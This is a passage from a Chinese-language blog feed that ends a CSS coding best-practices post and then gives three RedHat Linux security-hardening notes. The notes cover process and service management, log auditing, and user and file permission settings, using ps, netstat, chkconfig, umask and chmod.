</code></pre><p>同时，不要忘了 <code>CSS</code> 中是没有 <code>//</code> 这种注释方式的：</p><pre><code class="css">/*  Do  */p {
    padding: 15px;
    /*border: 1px solid #222;*/
}/*  Don&#39;t  */p {
    padding: 15px;
    // border: 1px solid #222;  /* 错误的注释 */
}
</code></pre><h1 id="使用-Kebab-case-命名变量"><a href="#使用-Kebab-case-命名变量" class="headerlink" title="使用 Kebab-case 命名变量"></a>使用 Kebab-case 命名变量</h1><blockquote><p>对于样式类名或者 ID 名的命名都需要在多个单词之间添加 <code>-</code> 符号，CSS 本身是大小写不敏感的因此你是用不了 <code>camelCase</code> 的，另一方面，很久之前也不支持下划线，所以现在的默认的命名方式就是使用 <code>-</code> :</p></blockquote><pre><code class="css">/*  Do     */
.footer-column-left { }

/*  Don&#39;t  */
.footerColumnLeft { }

.footer_column_left { }
</code></pre><p>而涉及到具体的变量命名规范时，建议是使用 <a href="//en.bem.info/">BEM</a> 规范，只要遵循一些简单的原则即可以保证基于组件风格的命名一致性。你也可以参考 <a href="//css-tricks.com/bem-101/">CSS Tricks</a> 来获得更多的细节描述。</p><h1 id="避免重复代码"><a href="#避免重复代码" class="headerlink" title="避免重复代码"></a>避免重复代码</h1><blockquote><p>大部分元素的 CSS 属性都是从 DOM 树根部继承而来，这也是其命名为级联样式表的由来。我们以 font 属性为例，该属性往往是继承自父属性，因此我们并不需要再单独地为元素设置该属性。</p></blockquote><p>我们只需要在 html 或者 body 中添加该属性然后使其层次传递下去即可：</p><pre><code class="css">html {
  font: normal 16px/1.4 sans-serif;
}
</code></pre><h1 id="使用-transform-添加-CSS-Animations"><a href="#使用-transform-添加-CSS-Animations" class="headerlink" title="使用 transform 添加 CSS Animations"></a>使用 transform 添加 CSS Animations</h1><blockquote><p>不建议直接改变元素的 <code>width</code> 与 <code>height</code> 属性或者 <code>left/top/bottom/right</code> 这些属性来达到动画效果，而应该优先使用 <code>transform()</code> 属性来提供更平滑的变换效果，并且能使得代码的可读性会更好：</p></blockquote><pre><code class="css">.ball {
    left: 50px;
    transition: 0.4s ease-out;
}/* Not Cool*/.ball.slide-out {
    left: 500px;
}/* Cool*/.ball.slide-out {
    transform: translateX(450px);
}
</code></pre><p><code>Transform</code> 的几个属性 <code>translate</code>、<code>rotate</code> 、<code>scale</code> 都具有比较好的浏览器兼容性可以放心使用。</p><h1 id="不要重复造轮子"><a href="#不要重复造轮子" class="headerlink" title="不要重复造轮子"></a>不要重复造轮子</h1><blockquote><p>现在 CSS 社区已经非常庞大，并且不断地有新的各式各样的库开源出来。这些库可以帮助我们解决从小的代码片到用于构建完整的响应式应用的全框架。</p></blockquote><p>所以如果下次你再碰到什么 CSS 问题的时候，在打算撸起袖子自己上之前可以尝试在 <a href="//github.com/">GitHub</a> 或者 <a href="//codepen.io/">CodePen</a> 上搜索可行方案。</p><h1 id="尽可能使用低优先级的选择器"><a href="#尽可能使用低优先级的选择器" class="headerlink" title="尽可能使用低优先级的选择器"></a>尽可能使用低优先级的选择器</h1><blockquote><p>并不是所有的 CSS 选择器的优先级都一样，很多初学者在使用 CSS 选择器的时候都是考虑以新的特性去复写全部的继承特性，不过这一点在某个元素多状态时就麻烦了。</p></blockquote><p>譬如下面这个例子：</p><pre><code class="css">a{
  color: #fff;
  padding: 15px;
}

a#blue-btn {
  background-color: blue;
}

a.active {
  background-color: red;
}
</code></pre><p>我们本来希望将 <code>.active</code> 类添加到按钮上然后使其显示为红色，不过在上面这个例子中很明显起不了作用，因为 <code>button</code> 已经以 <code>ID</code> 选择器设置过了背景色，也就是所谓的 <a href="//developer.mozilla.org/en-US/docs/Web/CSS/Specificity">Higher Selector Specificity</a>。一般来说，选择器的优先级顺序为：<code>ID(#id) &gt; Class(.class) &gt; Type(header)</code></p><h1 id="避免使用-important"><a href="#避免使用-important" class="headerlink" title="避免使用 !important"></a>避免使用 !important</h1><blockquote><p>认真的说，千万要避免使用 <code>!important</code>，这可能会导致你在未来的开发中无尽的属性重写，你应该选择更合适的 CSS 选择器。而唯一的可以使用 <code>!important</code> 属性的场景就是当你想去复写某些行内样式的时候，不过行内样式本身也是需要避免的。</p></blockquote><h1 id="使用-text-transform-属性设置文本大写"><a href="#使用-text-transform-属性设置文本大写" class="headerlink" title="使用 text-transform 属性设置文本大写"></a>使用 text-transform 属性设置文本大写</h1><pre><code class="html">&lt;div class=&quot;movie-poster&quot;&gt;Star Wars: The Force Awakens&lt;/div&gt;
</code></pre><pre><code class="css">.movie-poster {
  text-transform: uppercase;
}
</code></pre><h1 id="Em-Rem-以及-Pixel"><a href="#Em-Rem-以及-Pixel" class="headerlink" title="Em, Rem, 以及 Pixel"></a>Em, Rem, 以及 Pixel</h1><blockquote><p>已经有很多关于人们应该如何使用 <code>em</code>，<code>rem</code>，以及 <code>px</code> 作为元素尺寸与文本尺寸的讨论，而笔者认为，这三个尺寸单位都有其适用与不适用的地方。</p></blockquote><p>不同的开发与项目都有其特定的设置，因此并没有通用的规则来决定应该使用哪个单位，这里是我总结的几个考虑:</p><ul><li><strong>em</strong> ——————– 其基本单位即为当前元素的 <code>font-size</code> 值，经常适用于 <code>media-queries</code> 中，<code>em</code> 是特别适用于响应式开发中。</li><li><strong>rem</strong> ——————– 其是相对于 <code>html</code> 属性的单位，可以保证文本段落真正的响应式尺寸特性。</li><li><strong>px</strong> ——————– <code>Pixels</code> 并没有任何的动态扩展性，它们往往用于描述绝对单位，并且可以在设置值与最终的显示效果之间保留一定的一致性。</li></ul><h1 id="在大型项目中使用预处理器"><a href="#在大型项目中使用预处理器" class="headerlink" title="在大型项目中使用预处理器"></a>在大型项目中使用预处理器</h1><blockquote><p>估计你肯定听说过 <a href="//sass-lang.com/">Sass</a> , <a href="//lesscss.org/">Less</a> , <a href="//postcss.org/">PostCSS</a> , <a href="//stylus-lang.com/">Stylus</a> 这些预处理器与对应的语法。Preprocessors 可以允许我们将未来的 CSS 特性应用在当前的代码开发中，譬如变量支持、函数、嵌套式的选择器以及很多其他的特性。</p></blockquote><p>这里我们以 Sass 为例：</p><pre><code class="scss">$accent-color: #2196F3;

a {
  padding: 10px 15px;
  background-color: $accent-color;
}

a:hover {
  background-color: darken($accent-color,10%);
}
</code></pre><h1 id="使用-Autoprefixers-来提升浏览器兼容性"><a href="#使用-Autoprefixers-来提升浏览器兼容性" class="headerlink" title="使用 Autoprefixers 来提升浏览器兼容性"></a>使用 Autoprefixers 来提升浏览器兼容性</h1><blockquote><p>使用特定的浏览器前缀是CSS开发中常见的工作之一，不同的浏览器、不同的属性对于前缀的要求也不一样，这就使得我们无法在编码过程中记住所有的前缀规则。并且在写样式代码的时候还需要加上特定的浏览器前缀支持也是个麻烦活，幸亏现在也是有很多工具可以辅助我们进行这样的开发：</p></blockquote><ul><li>Online tools ——————– <strong><a href="//autoprefixer.github.io/">Autoprefixer</a></strong></li><li>Text editor plugins ——————– <strong><a href="//github.com/sindresorhus/sublime-autoprefixer">Sublime Text</a></strong> , <strong><a href="//atom.io/packages/autoprefixer">Atom</a></strong></li><li>Libraries ——————– <strong><a href="//github.com/postcss/autoprefixer">Autoprefixer</a></strong> (PostCSS)</li></ul><h1 id="在生产环境下使用-Minified-代码"><a href="#在生产环境下使用-Minified-代码" class="headerlink" title="在生产环境下使用 Minified 代码"></a>在生产环境下使用 Minified 代码</h1><blockquote><p>为了提升页面的加载速度，在生产环境下我们应该默认使用压缩之后的资源代码。在压缩的过程中，会将所有的空白与重复剔除掉从而减少整个文件的体积大小。</p></blockquote><p>当然，经过压缩之后的代码毫无可读性，因此在开发阶段我们还是应该使用普通的版本。对于 CSS 的压缩有很多的现行工具:</p><ul><li>Online tools ——————– <strong><a href="//cssminifier.com/">CSS Minifier</a></strong> (API included), <strong><a href="//csscompressor.com/">CSS Compressor</a></strong></li><li>Text editor plugins ——————– <strong><a href="//packagecontrol.io/packages/Minify">Sublime Text</a></strong> , <strong><a href="//atom.io/packages/atom-minify">Atom</a></strong></li><li>Libraries ——————– <strong><a href="//github.com/matthiasmullie/minify">Minfiy</a></strong> (PHP), <strong><a href="//github.com/css/csso">CSSO</a></strong> and <strong><a href="//cssnano.co/">CSSNano</a></strong> (PostCSS, Grunt, Gulp)</li></ul><p>选择哪个工具肯定是依赖于你自己的工作流啦~</p><h1 id="多参阅-Caniuse"><a href="#多参阅-Caniuse" class="headerlink" title="多参阅 Caniuse"></a>多参阅 Caniuse</h1><blockquote><p>不同的浏览器在兼容性上差异很大，因此如果我们可以针对我们所需要适配的浏览器，在 <a href="//caniuse.com/">caniuse</a> 上我们可以查询某个特性的浏览器版本适配性，是否需要添加特定的前缀或者在某个平台上是否存在 Bug 等等。不过光光使用 caniuse 肯定是不够的，我们还需要使用些额外的服务来进行检测。</p></blockquote><h1 id="Validate：校验"><a href="#Validate：校验" class="headerlink" title="Validate：校验"></a>Validate：校验</h1><blockquote><p>对于 CSS 的校验可能不如 HTML 校验或者 JavaScript 校验那么重要，不过在正式发布之前用 Lint 工具校验一波你的 CSS 代码还是很有意义的。它会告诉你代码中潜在的错误，提示你一些不符合最佳实践的代码以及给你一些提升代码性能的建议。</p></blockquote><p>就像 <strong>Minifers</strong> 与 <strong>Autoprefixers</strong>，也有很多可用的工具：</p><ul><li>Online tools: <strong><a href="//jigsaw.w3.org/css-validator/">W3 Validator</a></strong> , <strong><a href="//csslint.net/">CSS Lint</a></strong></li><li>Text editor plugins: <strong><a href="//packagecontrol.io/packages/W3CValidators">Sublime Text</a></strong> , <strong><a href="//atom.io/packages/csslint">Atom</a></strong> Libraries: <strong><a href="//stylelint.io/">stylelint</a></strong> (Node.js, PostCSS), <strong><a href="//www.npmjs.com/package/css-validator">css-validator</a></strong> (Node.js)</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Criterion </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RedHat 系统安全加固（四）：服务和进程管理]]></title>
      <url>/2016/10/service-and-process-management/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本系列笔记又是 Liunx 学习系列教程的一大步，本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统服务和进程的查看与关闭，通俗的来说进程是运行起来的程序。唯一标示进程的是进程描述符（PID），在 linux 内核中是通过 task_struck 和 task_list 来定义和管理进程的<a id="more"></a></p><h1 id="ps-查看系统进程"><a href="#ps-查看系统进程" class="headerlink" title="ps 查看系统进程"></a>ps 查看系统进程</h1><blockquote><p><code>ps</code> 命令用于报告当前系统的进程状态。可以搭配 <code>kill</code> 指令随时中断、删除不必要的程序。<code>ps</code> 命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p></blockquote><h2 id="相关选项"><a href="#相关选项" class="headerlink" title="相关选项"></a>相关选项</h2><ul><li><strong>-a</strong> ——————– 显示所有终端机下执行的程序，除了阶段作业领导者之外</li><li><strong>a</strong> ——————– 显示现行终端机下的所有程序，包括其他用户的程序</li><li><strong>-A</strong> ——————– 显示所有程序</li><li><strong>-u&lt;用户识别码&gt;</strong> ——————– 此选项的效果和指定 <code>&quot;-U&quot;</code> 选项相同</li><li><strong>u</strong> ——————– 以用户为主的格式来显示程序状况</li><li><strong>-U&lt;用户识别码&gt;</strong> ——————– 列出属于该用户的程序的状况，也可使用用户名称来指定</li><li><strong>U&lt;用户名称&gt;</strong> ——————– 列出属于该用户的程序的状况</li><li><strong>-e</strong> ——————– 此选项的效果和指定 <code>&quot;A&quot;</code> 选项相同</li><li><strong>e</strong> ——————– 列出程序时，显示每个程序所使用的环境变量</li><li><strong>-f</strong> ——————– 显示 UID，PPIP，C 与 STIME 栏位</li><li><strong>f</strong> ——————– 用 ASCII 字符显示树状结构，表达程序间的相互关系</li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>For Example:</code></p><pre><code class="bash">ps aux | grep ssh
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-1.png" alt="RedHat 安全加固"></p><h1 id="netstat-查看网络情况"><a href="#netstat-查看网络情况" class="headerlink" title="netstat 查看网络情况"></a>netstat 查看网络情况</h1><blockquote><p>netstat 命令用来打印 Linux 中网络系统的状态信息，可让你得知整个 Linux 系统的网络情况。</p></blockquote><h2 id="相关选项-1"><a href="#相关选项-1" class="headerlink" title="相关选项"></a>相关选项</h2><ul><li><strong>-t 或 –tcp</strong> ——————– 显示 TCP 传输协议的连线状况</li><li><strong>-u 或 –udp</strong> ——————– 显示 UDP 传输协议的连线状况</li><li><strong>-n 或 –numeric</strong> ——————– 直接使用 ip 地址，而不通过域名服务器</li><li><strong>-p 或 –programs</strong> ——————– 显示正在使用 Socket 的程序识别码和程序名称</li><li><strong>-l 或 –listening</strong> ——————– 显示监控中的服务器的 Socket</li></ul><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p><code>For Example:</code></p><pre><code class="bash">netstat -tulnp
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-2.png" alt="RedHat 安全加固"></p><h1 id="chkconfig-查看系统服务"><a href="#chkconfig-查看系统服务" class="headerlink" title="chkconfig 查看系统服务"></a>chkconfig 查看系统服务</h1><blockquote><p>chkconfig 命令检查、设置系统的各种服务。这是 Red Hat 公司遵循 GPL 规则所开发的程序，它可查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。谨记 chkconfig 不是立即自动禁止或激活一个服务，它只是简单的改变了符号连接。</p></blockquote><h2 id="选项解释"><a href="#选项解释" class="headerlink" title="选项解释"></a>选项解释</h2><ul><li><strong>–add</strong> ——————– 增加所指定的系统服务，让 <code>chkconfig</code> 指令得以管理它，并同时在系统启动的叙述文件内增加相关数据；</li><li><strong>–del</strong> ——————– 删除所指定的系统服务，不再由 <code>chkconfig</code> 指令管理，并同时在系统启动的叙述文件内删除相关数据；</li><li><p><strong>–level&lt;等级代号&gt;</strong> ——————– 指定读系统服务要在哪一个执行等级中开启或关毕。</p><ul><li>等级 <code>0</code> 表示 ——————– 表示关机</li><li>等级 <code>1</code> 表示 ——————– 单用户模式</li><li>等级 <code>2</code> 表示 ——————– 无网络连接的多用户命令行模式</li><li>等级 <code>3</code> 表示 ——————– 有网络连接的多用户命令行模式</li><li>等级 <code>4</code> 表示 ——————– 不可用</li><li>等级 <code>5</code> 表示 ——————– 带图形界面的多用户模式</li><li>等级 <code>6</code> 表示 ——————– 重新启动</li></ul></li><li><p><strong>–list</strong> ——————– 列出系统服务列表</p></li></ul><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p><code>For Example:</code></p><pre><code class="bash">chkconfig --list
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-3.png" alt="RedHat 安全加固"></p><h1 id="关闭进程或服务"><a href="#关闭进程或服务" class="headerlink" title="关闭进程或服务"></a>关闭进程或服务</h1><h2 id="kill-杀死进程"><a href="#kill-杀死进程" class="headerlink" title="kill 杀死进程"></a>kill 杀死进程</h2><blockquote><p>kill 命令用来删除执行中的程序或工作。kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15)，可将指定程序终止。若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 job 指令查看。</p></blockquote><h3 id="选项解释-1"><a href="#选项解释-1" class="headerlink" title="选项解释"></a>选项解释</h3><ul><li><strong>-a</strong>——————– 当处理当前进程时，不限制命令名和进程号的对应关系；</li><li><strong>-l &lt;信息编号&gt;</strong>——————– 若不加 <code>&lt;信息编号&gt;</code> 选项，则 <code>-l</code> 参数会列出全部的信息名称；</li><li><strong>p</strong>——————– 指定 kill 命令只打印相关进程的进程号，而不发送任何信号；</li><li><strong>-s &lt;信息名称或编号&gt;</strong>——————– 指定要送出的信息；</li><li><strong>-u</strong>——————– 指定用户。 参数</li></ul><p>只有第 9 种信号(<code>SIGKILL</code>)才可以无条件终止进程，其他信号进程都有权利忽略，下面是常用的信号——————–</p><ul><li><strong>HUP</strong> 1 终端断线</li><li><strong>INT</strong> 2 中断（同 <code>Ctrl + C</code>）</li><li><strong>QUIT</strong> 3 退出（同 <code>Ctrl + \</code>）</li><li><strong>TERM</strong> 15 终止</li><li><strong>KILL</strong> 9 强制终止</li><li><strong>CONT</strong> 18 继续（与 <code>STOP</code> 相反， <code>fg/bg</code> 命令）</li><li><strong>STOP</strong> 19 暂停（同 <code>Ctrl + Z</code>）</li></ul><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><p>用 ps 查找进程，然后用 kill 杀掉，<code>For Examlpe:</code></p><pre><code class="bash">ps -ef | grep ssh
kill 4456
</code></pre><p>用 netstat 查找进程，然后用 kill 杀掉，<code>For Examlpe:</code></p><pre><code class="bash">netstat -tulnp | grep ssh
kill 4456
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-4.png" alt="RedHat 安全加固"></p><h2 id="service-关闭服务"><a href="#service-关闭服务" class="headerlink" title="service 关闭服务"></a>service 关闭服务</h2><blockquote><p>service 命令是 Redhat Linux 兼容的发行版中用来控制系统服务的实用工具，它以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。</p></blockquote><h3 id="选项信息"><a href="#选项信息" class="headerlink" title="选项信息"></a>选项信息</h3><ul><li><strong>-h</strong>——————– 显示帮助信息；</li><li><strong>–status-all</strong>——————– 显示所服务的状态。</li></ul><h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><p><code>For Examlpe:</code></p><pre><code class="bash">service mysqld status
service mysqld stop
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-5.png" alt="RedHat 安全加固"></p><p>那么要是系统没有 <code>service</code> 命令，怎么办呢？Liunx 系统下是所有的服务名是存放在 <code>/etc/init.d/</code> 下的，所以也可以使用以下命令来停止服务，<code>For Examlpe:</code></p><pre><code class="bash">/etc/init.d/named status
/etc/init.d/named stop
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-6.png" alt="RedHat 安全加固"></p><h2 id="chkconfig-删除服务"><a href="#chkconfig-删除服务" class="headerlink" title="chkconfig 删除服务"></a>chkconfig 删除服务</h2><h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><p><code>For Examlpe:</code></p><pre><code class="bash">chkconfig --list | grep sendmail
chkconfig --del sendmail
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/process-7.png" alt="RedHat 安全加固"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RedHat 系统安全加固（三）：系统日志审计]]></title>
      <url>/2016/10/log-audit-function/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本系列笔记又是 Liunx 学习系列教程的一大步，本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置，加强系统的防御能力<a id="more"></a></p><h1 id="syslog-登录事件记录"><a href="#syslog-登录事件记录" class="headerlink" title="syslog 登录事件记录"></a>syslog 登录事件记录</h1><p>查看参数 <code>authpriv</code> 值，<code>For Exmaple:</code></p><pre><code class="bash">more /etc/syslog.conf | grep authpriv
</code></pre><p>表名登录事件记录在 <code>/var/log/secure</code> 文件中，使用以下命令检查非法记录</p><pre><code class="bash">more /var/log/secure | grep refused
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-16.png" alt="RedHat 安全加固"></p><h1 id="审计功能的进程"><a href="#审计功能的进程" class="headerlink" title="审计功能的进程"></a>审计功能的进程</h1><p>启动审计进程，<code>For Exmaple:</code></p><pre><code class="bash">service auditd start
service psacct start
</code></pre><p>启动 <code>psacct</code> 服务</p><pre><code class="bash">service psacct start
chkconfig psacct on
</code></pre><h1 id="查看记录审计的日志"><a href="#查看记录审计的日志" class="headerlink" title="查看记录审计的日志"></a>查看记录审计的日志</h1><ul><li><code>auditd</code> 审计进程日志记录在 <code>/var/log/audit/audit.log</code></li><li><code>psacct</code> 日志记录在 <code>/var/account/pacct</code></li></ul><blockquote><p>注意：<code>pacct</code> 日志是二进制文件，使用以下命令进行查看</p></blockquote><p><code>For Exmaple:</code></p><pre><code class="bash">lastcomm -f /var/account/pacct
</code></pre><h1 id="登录日志查看"><a href="#登录日志查看" class="headerlink" title="登录日志查看"></a>登录日志查看</h1><p><code>lastlog</code> 查看用户最后一次登录时间，<code>For Exmaple:</code></p><pre><code class="bash">lastlog
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-17.png" alt="RedHat 安全加固"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RedHat 系统安全加固（二）：用户和文件权限]]></title>
      <url>/2016/10/user-and-file-permissions/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本系列笔记又是 Liunx 学习系列教程的一大步，本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限），加强系统的防御能力<a id="more"></a></p><h1 id="主要的介绍"><a href="#主要的介绍" class="headerlink" title="主要的介绍"></a>主要的介绍</h1><p>Linux 文件系统的安全主要是通过设置文件的权限来实现的。每一个 Linux 的文件或目录，都有 3 组属性，分别定义文件或目录的所有者，用户组和其他人的使用权限（<code>只读</code>、<code>可写</code>、<code>可执行</code>、<code>允许 SUID</code>、<code>允许 SGID</code> 等）。特别注意，权限为 <code>SUID</code> 和 <code>SGID</code> 的可执行文件，在程序运行过程中，会给进程赋予所有者的权限，如果被黑客发现并利用就会给系统造成危害。</p><h1 id="查找同时存在-SUID-和-SGID-的文件"><a href="#查找同时存在-SUID-和-SGID-的文件" class="headerlink" title="查找同时存在 SUID 和 SGID 的文件"></a>查找同时存在 SUID 和 SGID 的文件</h1><p>使用 <code>find</code> 命令</p><pre><code class="bash">find / -xdev -perm  -6000
</code></pre><p>举例，普通用户无法直接 vi 修改 <code>/etc/passwd</code> 文件，但却可以通过 <code>passwd</code> 命令来修改自身的密码。这时就利用了 <code>/bin/passwd</code> 的 SUID 的权限。</p><p>如果一个程序被设置成了 <code>S</code> 位标志，那么普通用户就可以以 root 身份来运行这个程序。对系统安全性有较大不利影响，所以应禁止所有不必要的 <code>SUID/SGID</code> 程序。</p><p>修改部分系统文件的 SUID 和 SGID 的权限：</p><pre><code class="bash">chmod a-s /usr/bin/chage
chmod a-s /usr/bin/gpasswd
chmod a-s /usr/bin/wall
chmod a-s /usr/bin/chfn
chmod a-s /usr/bin/chsh
chmod a-s /usr/bin/newgrp
chmod a-s /usr/bin/write
chmod a-s /usr/sbin/usernetctl
chmod a-s /bin/mount
chmod a-s /bin/umount
chmod a-s /sbin/netreport
</code></pre><h2 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h2><p>选项解释</p><ul><li><strong><code>-perm &lt;权限数值&gt;</code></strong> =&gt; 查找符合指定的权限数值的文件或目录；</li><li><strong><code>-xdev</code></strong> =&gt; 将范围局限在先行的文件系统中；</li><li><code>find -perm mode</code> =&gt; 表示严格匹配，也就是你的文件权限位转换成对应的十进制数字与 mode 一模一样，那么匹配成功，需要注意的是如果 mode 给的数字不足 3 位，那么前面自动添 0 (严格的说是不足 4 位，原因就是前面所说的 <code>SetUID</code>，<code>SetGID</code>）</li><li><code>find -perm -mode</code> =&gt; 表示模糊查询，也就是说你的文件权限位转换成对应的十进制数字被 mode 包含，就会被搜索出来</li><li><code>find -perm +mode</code> =&gt; 与 <code>-mode</code> 的区别是 <code>+mode</code> 只需其中的任意一个 1 的部分被匹配，<code>-mode</code> 是所有 1 的部分都必须被匹配，同样 <code>+mode</code> 也不管 0 位</li></ul><h1 id="文件的默认权限"><a href="#文件的默认权限" class="headerlink" title="文件的默认权限"></a>文件的默认权限</h1><p>使用 <code>umask</code> 指定当前用户创建文件夹和文件的默认权限属性</p><ul><li>若使用者建立为<code>文件</code>，则预设<code>没有可执行 ( x ) 项目</code>，亦即只有 <code>rw</code> 这两个项目，也就是最大为 <code>666</code>，即权限为 <code>-rw-rw-rw-</code></li><li>若使用者建立为<code>目录</code>，则由于 <code>x</code> 与是否可以进入此目录有关，因此预设为所有权限均开放，亦即为 <code>777</code>，即权限为 <code>drwxrwxrwx</code></li></ul><h2 id="修改默认权限"><a href="#修改默认权限" class="headerlink" title="修改默认权限"></a>修改默认权限</h2><p>主要修改配置文件 <code>/etc/profile</code>、<code>/etc/bashrc</code>、<code>/etc/csh.login</code>、<code>/etc/csh.cshrc</code></p><ul><li>生成目录的权限为 <code>777-002=775</code>，即 <code>drwxrwxr-x</code></li><li>生成文件的权限为 <code>666-002=664</code>，即 <code>-rw-rw-r--</code></li></ul><p><code>For Exmaple:</code></p><pre><code class="bash">umask 002
</code></pre><ul><li>生成目录的权限为 <code>777-022=755</code>，即 <code>drwxrwxr-x</code></li><li>生成文件的权限为 <code>666-022=644</code>，即 -<code>rw-r--r--</code></li></ul><p><code>For Exmaple:</code></p><pre><code class="bash">umask 022
</code></pre><blockquote><p>注意，不要单纯的进行数字加减<br><br>比如，<code>umask 003</code>，如果以数字加减，则文件权限为 <code>666-003=663</code>，相当于 <code>-rw-rw--wx</code>，显然不正确，应该先转换成权限属性再相减 <code>-rw-rw-rw-</code> 减去 <code>--------wx</code>，即应该为 <code>-rw-rw-r--</code><br><br>影响：移动规范要求 <code>umask 027</code>，这样生成的文件默认权限为 <code>-rw-r-----</code>，只有本用户可读、写、执行。如果业务需要，其他用户也需要操作该 用户的文件，就会有问题。可以使用默认的 <code>022</code></p></blockquote><h1 id="环境变量的安全性"><a href="#环境变量的安全性" class="headerlink" title="环境变量的安全性"></a>环境变量的安全性</h1><h2 id="root-用户环境变量的安全性"><a href="#root-用户环境变量的安全性" class="headerlink" title="root 用户环境变量的安全性"></a>root 用户环境变量的安全性</h2><p>主要检查 <code>PATH</code> 变量，<code>For Exmaple:</code></p><pre><code class="bash">echo $PATH | egrep &#39;(^|:)(\.|:|$)&#39;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/redhat-reinforce-12.png" alt="RedHat 安全加固"></p><p>检查是否包含组目录权限为 <code>o+w</code> 的目录或者 <code>g+w</code> 的目录</p><pre><code class="bash">find `echo $PATH | tr &#39;:&#39; &#39; &#39;` -type d \( -perm -002 -o -perm -020 \) -ls
</code></pre><ul><li><code>-002</code> 表示任何目录或文件，只要带 <code>o+w</code> 就匹配</li><li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限，即 <code>-------w-</code></li></ul><blockquote><p>可能会出现报错提示 <code>/root/bin</code> 目录不存在，<code>PATH</code> 里有该路径，而实际上没有，可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</p></blockquote><h2 id="检查-root-用户环境变量-path-规范"><a href="#检查-root-用户环境变量-path-规范" class="headerlink" title="检查 root 用户环境变量 path 规范"></a>检查 root 用户环境变量 path 规范</h2><p>检查系统 root 用户环境变量 path 中是否包含 <code>“.”</code>，<code>For Exmaple:</code></p><pre><code class="bash">env | grep PATH
</code></pre><blockquote><p>修改文件 <code>/etc/profile</code>、<code>/etc/bashrc</code> 或 <code>/root/.bash_profile</code> 在 <code>“PATH＝……”</code> 这句中删除</p></blockquote><ul><li><code>-002</code> 表示任何目录或文件，只要带 <code>o+w</code> 就匹配</li><li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限，即 <code>-------w-</code></li></ul><blockquote><p>可能会出现报错提示 <code>/root/bin</code> 目录不存在，<code>PATH</code> 里有该路径，而实际上没有，可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</p></blockquote><h1 id="远程连接的安全性配置"><a href="#远程连接的安全性配置" class="headerlink" title="远程连接的安全性配置"></a>远程连接的安全性配置</h1><p>主要查找系统中是否含有 <code>.netrc</code> 和 <code>.rhosts</code> 文件，如无必要，删除这两个文件，<code>For Exmaple:</code></p><pre><code class="bash">find / -name .netrc
find / -name .rhosts
</code></pre><h1 id="重要目录和文件的权限设置"><a href="#重要目录和文件的权限设置" class="headerlink" title="重要目录和文件的权限设置"></a>重要目录和文件的权限设置</h1><p>执行以下命令检查目录和文件的权限设置情况</p><pre><code class="bash">ls -l /etc/
ls -l /etc/rc.d/init.d/
ls -l /tmp
ls -l /etc/inetd.conf
ls -l /etc/passwd
ls -l /etc/shadow
ls -l /etc/group
ls -l /etc/security
ls -l /etc/services
ls -l /etc/rc*.d
</code></pre><p>对于重要目录，建议执行如下类似操作，<code>For Exmaple:</code></p><pre><code class="bash">chmod -R 750 /etc/rc.d/init.d/*
</code></pre><p>这样只有 root 可以读、写和执行，编写脚本一次性执行，<code>For Exmaple:</code></p><pre><code class="bash">chmod 644 /etc/passwd
chmod 600 /etc/shadow
chmod 644 /etc/group
chmod 600 /etc/gshadow
chmod 700 /bin/rpm
chmod 644 /usr/bin/xhost
chmod 664 /etc/hosts
chmod 644 /etc/exports
chmod 644 /etc/issue
chmod 664 /var/log/wtmp
chmod 644 /etc/services
